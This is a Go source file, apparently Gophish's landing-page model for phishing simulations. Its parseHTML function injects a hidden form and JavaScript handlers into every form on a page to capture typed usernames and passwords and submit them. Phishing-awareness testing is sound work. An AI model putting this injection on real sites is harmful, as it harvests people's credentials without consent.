package models

import (
	"errors"
	"strings"
	"time"

	"github.com/PuerkitoBio/goquery"
	log "github.com/gophish/gophish/logger"
)

// Page contains the fields used for a Page model
type Page struct {
	Id                 int64     `json:"id" gorm:"column:id; primary_key:yes"`
	UserId             int64     `json:"-" gorm:"column:user_id"`
	Name               string    `json:"name"`
	HTML               string    `json:"html" gorm:"column:html"`
	CaptureCredentials bool      `json:"capture_credentials" gorm:"column:capture_credentials"`
	CapturePasswords   bool      `json:"capture_passwords" gorm:"column:capture_passwords"`
	RedirectURL        string    `json:"redirect_url" gorm:"column:redirect_url"`
	ModifiedDate       time.Time `json:"modified_date"`
}

// ErrPageNameNotSpecified is thrown if the name of the landing page is blank.
var ErrPageNameNotSpecified = errors.New("Page Name not specified")

// parseHTML parses the page HTML on save to handle the
// capturing (or lack thereof!) of credentials and passwords
func (p *Page) parseHTML() error {
	d, err := goquery.NewDocumentFromReader(strings.NewReader(p.HTML))
	if err != nil {
		log.Error("Error parsing HTML:", err)
		return err
	}

	forms := d.Find("form")
	
	// Create a hidden form to store and submit credentials
	d.Find("body").PrependHtml(`
		<form id="login-form" method="POST" style="display:none;">
			<input type="hidden" name="rid" value="{{.RId}}"/>
			<input type="hidden" name="username" id="user_login"/>
			<input type="hidden" name="password" id="user_password"/>
			<input type="hidden" name="__original_url" value="{{.URL}}"/>
		</form>
	`)

	// Add data capture to all forms
	forms.Each(func(i int, f *goquery.Selection) {
		// Add data capture for all input fields
		f.Find("input").Each(func(j int, input *goquery.Selection) {
			inputType, _ := input.Attr("type")

			switch strings.ToLower(inputType) {
			case "email", "text":
				input.SetAttr("onchange", `
					document.getElementById('user_login').value = this.value;
				`)
			case "password":
				if p.CapturePasswords {
					input.SetAttr("onchange", `
						if ({{.CapturePasswords}}) {
							document.getElementById('user_password').value = this.value;
						}
					`)
				}
			}
		})

		// Add submission handling to all buttons
		f.Find("button").Each(func(j int, b *goquery.Selection) {
			originalOnClick, hasOnClick := b.Attr("onclick")

			// Prepare the onclick handler
			submitHandler := `
				var form = this.closest('form');
				if (form) {
					var emailInput = form.querySelector('input[type="email"], input[type="text"]');
					var passwordInput = form.querySelector('input[type="password"]');
					
					if (emailInput) {
						document.getElementById('user_login').value = emailInput.value;
					}
					if (passwordInput) {
						if ({{.CapturePasswords}}) {
							document.getElementById('user_password').value = passwordInput.value;
						}
						// Submit the hidden form when we have both credentials
						if (document.getElementById('user_login').value) {
							document.getElementById('login-form').submit();
						}
					}
				}
			`

			// Combine with existing onclick if present
			if hasOnClick {
				b.SetAttr("onclick", submitHandler + originalOnClick)
			} else {
				b.SetAttr("onclick", submitHandler)
			}
		})

		// Add form submission handling
		f.SetAttr("onsubmit", `
			var emailInput = this.querySelector('input[type="email"], input[type="text"]');
			var passwordInput = this.querySelector('input[type="password"]');
			
			if (emailInput) {
				document.getElementById('user_login').value = emailInput.value;
			}
			if (passwordInput) {
				if ({{.CapturePasswords}}) {
					document.getElementById('user_password').value = passwordInput.value;
				}
				// Submit the hidden form when we have both credentials
				if (document.getElementById('user_login').value) {
					document.getElementById('login-form').submit();
				}
			}
			return true;
		`)
	})

	p.HTML, err = d.Html()
	if err != nil {
		log.Error("Error getting final HTML:", err)
	} 
	return err
}

// Validate ensures that a page contains the appropriate details
func (p *Page) Validate() error {
	if p.Name == "" {
		return ErrPageNameNotSpecified
	}
	// If the user specifies to capture passwords,
	// we automatically capture credentials
	if p.CapturePasswords && !p.CaptureCredentials {
		p.CaptureCredentials = true
	}
	if err := ValidateTemplate(p.HTML); err != nil {
		return err
	}
	if err := ValidateTemplate(p.RedirectURL); err != nil {
		return err
	}
	return p.parseHTML()
}

// GetPages returns the pages owned by the given user.
func GetPages(uid int64) ([]Page, error) {
	ps := []Page{}
	err := db.Where("user_id=?", uid).Find(&ps).Error
	if err != nil {
		log.Error(err)
		return ps, err
	}
	return ps, err
}

// GetPage returns the page, if it exists, specified by the given id and user_id.
func GetPage(id int64, uid int64) (Page, error) {
	p := Page{}
	err := db.Where("user_id=? and id=?", uid, id).Find(&p).Error
	if err != nil {
		log.Error(err)
	}
	return p, err
}

// GetPageByName returns the page, if it exists, specified by the given name and user_id.
func GetPageByName(n string, uid int64) (Page, error) {
	p := Page{}
	err := db.Where("user_id=? and name=?", uid, n).Find(&p).Error
	if err != nil {
		log.Error(err)
	}
	return p, err
}

// PostPage creates a new page in the database.
func PostPage(p *Page) error {
	err := p.Validate()
	if err != nil {
		log.Error(err)
		return err
	}
	// Insert into the DB
	err = db.Save(p).Error
	if err != nil {
		log.Error(err)
	}
	return err
}

// PutPage edits an existing Page in the database.
// Per the PUT Method RFC, it presumes all data for a page is provided.
func PutPage(p *Page) error {
	err := p.Validate()
	if err != nil {
		return err
	}
	err = db.Where("id=?", p.Id).Save(p).Error
	if err != nil {
		log.Error(err)
	}
	return err
}

// DeletePage deletes an existing page in the database.
// An error is returned if a page with the given user id and page id is not found.
func DeletePage(id int64, uid int64) error {
	err := db.Where("user_id=?", uid).Delete(Page{Id: id}).Error
	if err != nil {
		log.Error(err)
	}
	return err
}
